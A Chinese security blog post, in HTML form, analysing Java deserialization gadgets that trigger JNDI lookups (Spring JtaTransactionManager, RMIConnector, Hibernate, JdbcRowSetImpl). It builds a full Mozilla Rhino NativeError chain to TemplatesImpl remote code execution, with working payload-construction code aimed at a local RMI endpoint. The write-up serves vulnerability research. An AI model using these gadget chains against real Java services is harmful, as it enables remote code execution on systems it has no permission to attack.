@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>利用反序列化进行JNDI注入 - Twings</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 五月 12日 2020, 7:48 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.1k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      10 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看文章提到 ysoserial 里面的一条反序列化链，结果一看流程相当复杂，所以研究一下。</p>
+<p>倒是没有什么新的知识。</p>
+<a id="more"></a>
+<hr>
+<h3 id="org-springframework-transaction-jta-JtaTransactionManager-maven"><a href="#org-springframework-transaction-jta-JtaTransactionManager-maven" class="headerlink" title="org.springframework.transaction.jta.JtaTransactionManager(maven)"></a>org.springframework.transaction.jta.JtaTransactionManager(maven)</h3><p>一个 readObject 可以直接触发 JNDI lookup 的类：</p>
+<pre><code class="java">private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+    // Rely on default serialization; just initialize state after deserialization.
+    ois.defaultReadObject();
+
+    // Create template for client-side JNDI lookup.
+    this.jndiTemplate = new JndiTemplate();
+
+    // Perform a fresh lookup for JTA handles.
+    initUserTransactionAndTransactionManager();
+    initTransactionSynchronizationRegistry();
+}
+...
+protected void initUserTransactionAndTransactionManager() throws TransactionSystemException {
+    if (this.userTransaction == null) {
+        // Fetch JTA UserTransaction from JNDI, if necessary.
+        if (StringUtils.hasLength(this.userTransactionName)) {
+            this.userTransaction = lookupUserTransaction(this.userTransactionName);
+            this.userTransactionObtainedFromJndi = true;
+        }
+        else {
+            this.userTransaction = retrieveUserTransaction();
+            if (this.userTransaction == null &amp;&amp; this.autodetectUserTransaction) {
+                // Autodetect UserTransaction at its default JNDI location.
+                this.userTransaction = findUserTransaction();
+            }
+        }
+    }
+    ...
+}
+...
+protected UserTransaction lookupUserTransaction(String userTransactionName) throws TransactionSystemException {
+    try {
+        if (logger.isDebugEnabled()) {
+            logger.debug(&quot;Retrieving JTA UserTransaction from JNDI location [&quot; + userTransactionName + &quot;]&quot;);
+        }
+        return getJndiTemplate().lookup(userTransactionName, UserTransaction.class);
+    }
+    catch (NamingException ex) {
+        throw new TransactionSystemException(
+            &quot;JTA UserTransaction is not available at JNDI location [&quot; + userTransactionName + &quot;]&quot;, ex);
+    }
+}
+...
+public Object lookup(final String name) throws NamingException {
+    if (logger.isDebugEnabled()) {
+        logger.debug(&quot;Looking up JNDI object with name [&quot; + name + &quot;]&quot;);
+    }
+    Object result = execute(ctx -&gt; ctx.lookup(name));
+    if (result == null) {
+        throw new NameNotFoundException(
+            &quot;JNDI object with [&quot; + name + &quot;] not found: JNDI implementation returned null&quot;);
+    }
+    return result;
+}
+</code></pre>
+<p>所以 payload 构造也很简单：</p>
+<pre><code class="java">JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
+jtaTransactionManager.setUserTransactionName(&quot;rmi://127.0.0.1:1099/Exploit&quot;);
+unserialize(serialize(jtaTransactionManager));
+</code></pre>
+<h3 id="javax-management-remote-rmi-RMIConnector-JDK"><a href="#javax-management-remote-rmi-RMIConnector-JDK" class="headerlink" title="javax.management.remote.rmi.RMIConnector(JDK)"></a>javax.management.remote.rmi.RMIConnector(JDK)</h3><p>要配合能无参或以 Map/null 为参数调用任意方法的反序列化链使用，connect 方法可以触发 lookup：</p>
+<pre><code class="java">public synchronized void connect(Map&lt;String,?&gt; environment) throws IOException {
+    ...
+    RMIServer stub = (rmiServer!=null)?rmiServer:
+    findRMIServer(jmxServiceURL, usemap);
+    ...
+}
+...
+private RMIServer findRMIServer(JMXServiceURL directoryURL, Map&lt;String, Object&gt; environment) throws NamingException, IOException {
+    ...   
+    if (path.startsWith(&quot;/jndi/&quot;))
+        return findRMIServerJNDI(path.substring(6,end), environment, isIiop);
+    ...
+}
+...
+private RMIServer findRMIServerJNDI(String jndiURL, Map&lt;String, ?&gt; env, boolean isIiop) throws NamingException {
+    ...
+    InitialContext ctx = new InitialContext(EnvHelp.mapToHashtable(env));
+
+    Object objref = ctx.lookup(jndiURL);
+    ...
+}
+</code></pre>
+<p>payload 构造也很简单，理一下流程调试一下就好了：</p>
+<pre><code class="java">JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi://&quot;);
+setFieldValue(jmxServiceURL, &quot;urlPath&quot;, &quot;/jndi/rmi://127.0.0.1:1099/Exploit&quot;); // 反射赋值
+RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);
+rmiConnector.connect();
+</code></pre>
+<h3 id="org-hibernate-jmx-StatisticsService-maven"><a href="#org-hibernate-jmx-StatisticsService-maven" class="headerlink" title="org.hibernate.jmx.StatisticsService(maven)"></a>org.hibernate.jmx.StatisticsService(maven)</h3><p>要配合能以 String 为参数调用任意方法的反序列化链使用，setSessionFactoryJNDIName 方法会 lookup：</p>
+<pre><code class="java">public void setSessionFactoryJNDIName(String sfJNDIName) {
+    this.sfJNDIName = sfJNDIName;
+    try {
+        final SessionFactory sessionFactory;
+        final Object jndiValue = new InitialContext().lookup( sfJNDIName );
+        ...
+    }
+    ...
+}
+</code></pre>
+<p>实在太简单就不构造了。</p>
+<h3 id="com-sun-rowset-JdbcRowSetImpl-JDK"><a href="#com-sun-rowset-JdbcRowSetImpl-JDK" class="headerlink" title="com.sun.rowset.JdbcRowSetImpl(JDK)"></a>com.sun.rowset.JdbcRowSetImpl(JDK)</h3><p>要配合能无参调用任意方法的反序列化链使用，execute 会 lookup：</p>
+<pre><code class="java">public void execute() throws SQLException {
+    this.prepare();
+    ...
+}
+...
+protected PreparedStatement prepare() throws SQLException {
+    this.conn = this.connect();
+    ...
+}
+...
+private Connection connect() throws SQLException {
+    if (this.conn != null) {
+        return this.conn;
+    } else if (this.getDataSourceName() != null) {
+        try {
+            InitialContext var1 = new InitialContext();
+            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+            ...
+        }
+        ...
+    }
+    ...
+}
+</code></pre>
+<p>也很简单，不构建了。</p>
+<hr>
+<h3 id="org-mozilla-javascript-NativeError-maven"><a href="#org-mozilla-javascript-NativeError-maven" class="headerlink" title="org.mozilla.javascript.NativeError(maven)"></a>org.mozilla.javascript.NativeError(maven)</h3><p>一条相当复杂的反序列化链，可以利用包内类的 invoke 进行任意无参方法调用，有参方法调用可能也可以，但是要经过 Context 的 jsToJava 方法，更加麻烦，一般来说调用无参方法已经够了，可以利用 TemplatesImpl 类实现 RCE。</p>
+<p>众所周知，JDK 里面有一个类 BadAttributeValueExpException，可以调用任意类的 toString 方法，而 NativeError 的 toString 方法正好有特殊的操作：</p>
+<pre><code class="java">// NativeError.java
+public String toString()
+{
+    return js_toString(this);
+}
+...
+private static String js_toString(Scriptable thisObj)
+{
+    return getString(thisObj, &quot;name&quot;)+&quot;: &quot;+getString(thisObj, &quot;message&quot;);
+}
+...
+private static String getString(Scriptable obj, String id)
+{
+    Object value = ScriptableObject.getProperty(obj, id);
+    ...
+}
+...
+// ScriptableObject.java
+public static Object getProperty(Scriptable obj, String name)
+{
+    Scriptable start = obj;
+    Object result;
+    do {
+        result = obj.get(name, start);
+        if (result != Scriptable.NOT_FOUND)
+            break;
+        obj = obj.getPrototype();
+    } while (obj != null);
+    return result;
+}
+...
+// IdScriptableObject.java
+public Object get(String name, Scriptable start)
+{
+    ...
+    return super.get(name, start);
+}
+...
+// ScriptableObject.java
+public Object get(String name, Scriptable start)
+{
+    return getImpl(name, 0, start);
+}
+...
+private Object getImpl(String name, int index, Scriptable start)
+{
+    Slot slot = getSlot(name, index, SLOT_QUERY);
+    if (slot == null) {
+        return Scriptable.NOT_FOUND;
+    }
+    if (!(slot instanceof GetterSlot)) {
+        return slot.value;
+    }
+    Object getterObj = ((GetterSlot)slot).getter;
+    if (getterObj != null) {
+        if (getterObj instanceof MemberBox) {
+            MemberBox nativeGetter = (MemberBox)getterObj;
+            Object getterThis;
+            Object[] args;
+            if (nativeGetter.delegateTo == null) {
+                getterThis = start;
+                args = ScriptRuntime.emptyArgs;
+            } else {
+                getterThis = nativeGetter.delegateTo;
+                args = new Object[] { start };
+            }
+            return nativeGetter.invoke(getterThis, args);
+        } else {
+            Function f = (Function)getterObj;
+            Context cx = Context.getContext();
+            return f.call(cx, f.getParentScope(), start,
+                          ScriptRuntime.emptyArgs);
+        }
+    }
+    ...
+}
+</code></pre>
+<p>可以看到，getImpl 方法里面有危险的操作，而 getterObj 是 Object 类型，来自 name 相对应的 slot 的 getter，是可控参数。所以 invoke 和 call 方法都有可能导致任意方法执行。我们先来看一下 invoke，执行的方法的参数是我们无法控制的，而且目标对象要继承 MemberBox，所以这里不是很好利用，最简单的利用方式是用来调用一个无参静态方法，因为反射调用静态方法是会忽略目标对象的。</p>
+<p>然后再看看 call，能调用一个继承了 Function 接口的类的 call 方法，而 NativeJavaMethod 类正好用得上：</p>
+<pre><code class="java">public Object call(Context cx, Scriptable scope, Scriptable thisObj, Object[] args) {
+    // Find a method that matches the types given.
+    ...
+
+    int index = findFunction(cx, methods, args);
+    ...
+
+    MemberBox meth = methods[index];
+    Class&lt;?&gt;[] argTypes = meth.argTypes;
+
+    if (meth.vararg) {
+    ...
+    } else {  
+    // First, we marshall the args.
+        Object[] origArgs = args;
+        for (int i = 0; i &lt; args.length; i++) {
+            Object arg = args[i];
+            Object coerced = Context.jsToJava(arg, argTypes[i]);
+            if (coerced != arg) {
+                if (origArgs == args) {
+                    args = args.clone();
+                }
+                args[i] = coerced;
+            }
+        }
+    }
+    Object javaObject;
+    if (meth.isStatic()) {
+        javaObject = null;  // don&#39;t need an object
+    } else {
+        Scriptable o = thisObj;
+        Class&lt;?&gt; c = meth.getDeclaringClass();
+        for (;;) {
+            if (o == null) {
+                throw Context.reportRuntimeError3(
+                &quot;msg.nonjava.method&quot;, getFunctionName(),
+                ScriptRuntime.toString(thisObj), c.getName());
+            }
+            if (o instanceof Wrapper) {
+                javaObject = ((Wrapper)o).unwrap();
+                if (c.isInstance(javaObject)) {
+                    break;
+                }
+            }
+            o = o.getPrototype();
+        }
+    }
+    ...
+
+    Object retval = meth.invoke(javaObject, args);
+}
+</code></pre>
+<p>meth 来自 methods，findFunction 会返回 0，可控；args 是空，代表调用无参方法；javaObject 来自继承了 Wrapper 接口的对象的 unwrap 方法，而该对象又来自 thisObj，即 NativeError 的 getPrototype 方法：</p>
+<pre><code class="java">public Scriptable getPrototype()
+{
+    return prototypeObject;
+}
+</code></pre>
+<p>要求继承了 Scriptable 接口，而且 unwrap 方法的返回可控，NativeJavaObject 类符合这个要求：</p>
+<pre><code class="java">public Object unwrap() {
+    return javaObject;
+}
+</code></pre>
+<p>至此，我们可以通过 call 调用任意类的无参函数，可以利用 TemplatesImpl  RCE 了。但是构造的 payload 在反序列化时会发现一个问题，发生在 NativeJavaObject 的 initMembers 方法中：</p>
+<pre><code class="java">// NativeJavaObject
+protected void initMembers() {
+    ...
+    members = JavaMembers.lookupClass(parent, dynamicType, staticType, isAdapter);
+    ...
+}
+// JavaMembers
+static JavaMembers lookupClass(Scriptable scope, Class&lt;?&gt; dynamicType, Class&lt;?&gt; staticType, boolean includeProtected)
+{
+    ...
+    scope = ScriptableObject.getTopLevelScope(scope);
+    ClassCache cache = ClassCache.get(scope);
+    ...
+}
+// ClassCache
+public static ClassCache get(Scriptable scope)
+{
+    ClassCache cache = (ClassCache)ScriptableObject.getTopScopeValue(scope, AKEY);
+    ...
+}
+// ScriptableObject
+public static Object getTopScopeValue(Scriptable scope, Object key)
+{
+    scope = ScriptableObject.getTopLevelScope(scope);
+    for (;;) {
+        if (scope instanceof ScriptableObject) {
+            ScriptableObject so = (ScriptableObject)scope;
+            Object value = so.getAssociatedValue(key);
+            if (value != null) {
+                return value;
+            }
+        }
+        scope = scope.getPrototype();
+        if (scope == null) {
+            return null;
+        }
+    }
+}
+</code></pre>
+<p>简单来说，就是 NativeJavaObject 对象的 parent 成员的 associatedValues 这个 Map 中缺少键为 ClassCache 的值，需要修改 NativeJavaObject 的生成方式：</p>
+<pre><code class="java">ScriptableObject nativeObject = (ScriptableObject)NativeErrorConstructor.newInstance();
+(new ClassCache()).associate(nativeObject);
+NativeJavaObject nativeJavaObject = new NativeJavaObject(nativeObject, getTemplatesImpl(), TemplatesImpl.class);
+</code></pre>
+<p>然后又会发现另一个问题：</p>
+<pre><code>Exception in thread &quot;main&quot; java.lang.RuntimeException: No Context associated with current Thread
+</code></pre><p>追踪一下会发现问题出在这里：</p>
+<pre><code class="java">// getImpl
+Context cx = Context.getContext();
+// getContext
+Context cx = getCurrentContext();
+// getCurrentContext
+Object helper = VMBridge.instance.getThreadContextHelper();
+return VMBridge.instance.getContext(helper);
+</code></pre>
+<p>简单来说，就是这个时候获取不到 JavaScript 上下文环境，所以要在调用 call 之前先 setContext。而 js_toString 正好有两个 getString，说明我们可以执行两次方法。我们先观察一下要怎么 setContext，可以发现 Context 的静态无参方法 enter 最后会有一个 setContext 的操作，所以我们只需要用 name 调用 enter，再用 message 调用 TemplatesImpl  即可。因为 prototypeObject 只能有一个，所以 enter 我们可以通过 getImpl 里面 MemberBox 的 invoke 方法来调用，最后的 payload：</p>
+<pre><code class="java">// 构造 NativeError 来连接 toString
+Constructor NativeErrorConstructor = Class.forName(&quot;org.mozilla.javascript.NativeError&quot;).getDeclaredConstructor();
+NativeErrorConstructor.setAccessible(true);
+ScriptableObject scriptableObject = (ScriptableObject)NativeErrorConstructor.newInstance();
+// 通过 NativeJavaMethod 的 call 方法反射调用 newTransformer
+Method newTransformerMethod = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;).getDeclaredMethod(&quot;newTransformer&quot;);
+NativeJavaMethod newTransformer = new NativeJavaMethod(newTransformerMethod, &quot;message&quot;);
+scriptableObject.setGetterOrSetter(&quot;message&quot;, 0, newTransformer, false);
+// 先给 name 塞一个 getter，因为 setGetterOrSetter 设置的 getter 要继承 callable，后面再反射改掉
+Method enterMethod = Context.class.getDeclaredMethod(&quot;enter&quot;);
+NativeJavaMethod enter = new NativeJavaMethod(enterMethod, &quot;name&quot;);
+scriptableObject.setGetterOrSetter(&quot;name&quot;, 0, enter, false);
+// 通过 MemberBox 的 invoke 调用 Context 的 enter，因为是静态方法所以反射调用的时候可以无视目标类
+Class memberboxClass = Class.forName(&quot;org.mozilla.javascript.MemberBox&quot;);
+Constructor memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);
+memberboxClassConstructor.setAccessible(true);
+Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
+// 反射获取 name 的 slot，再反射设置为 MemberBox
+Method getSlot = ScriptableObject.class.getDeclaredMethod(&quot;getSlot&quot;, String.class, int.class, int.class);
+getSlot.setAccessible(true);
+Object slot = getSlot.invoke(scriptableObject, &quot;name&quot;, 0, 1);
+setFieldValue(slot, &quot;getter&quot;, memberboxClass);
+// 利用 NativeJavaObject 的 unwrap 返回一个 TemplatesImpl 对象
+ScriptableObject nativeObject = (ScriptableObject)NativeErrorConstructor.newInstance();
+(new ClassCache()).associate(nativeObject);
+NativeJavaObject nativeJavaObject = new NativeJavaObject(nativeObject, getTemplatesImpl(), TemplatesImpl.class);
+// 设置 Prototype 为 NativeJavaObject
+scriptableObject.setPrototype(nativeJavaObject);
+// 连接 readObject 和 toString
+BadAttributeValueExpException obj = new BadAttributeValueExpException(null);
+setFieldValue(obj, &quot;val&quot;, scriptableObject);
+</code></pre>
+<p>ysoserial 里面还有一个 MozillaRhino2 的payload，里面有详细的利用链，流程也不复杂，通过第一次反序列化调用的 readAdapterObject 里面的 in.readObject 反序列化第二个 NativeJavaObject，实现两次反射调用。暂时不研究了，留个坑。</p>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://www.anquanke.com/post/id/194384" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194384</a></p>
+<p><a href="https://codewhitesec.blogspot.com/2016/05/return-of-rhino-old-gadget-revisited.html" target="_blank" rel="noopener">https://codewhitesec.blogspot.com/2016/05/return-of-rhino-old-gadget-revisited.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/05/09/Java反序列化中的RMI、JRMP、JNDI、LDAP/">
+                        <span>Java反序列化中的RMI、JRMP、JNDI、LDAP</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "利用反序列化进行JNDI注入&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
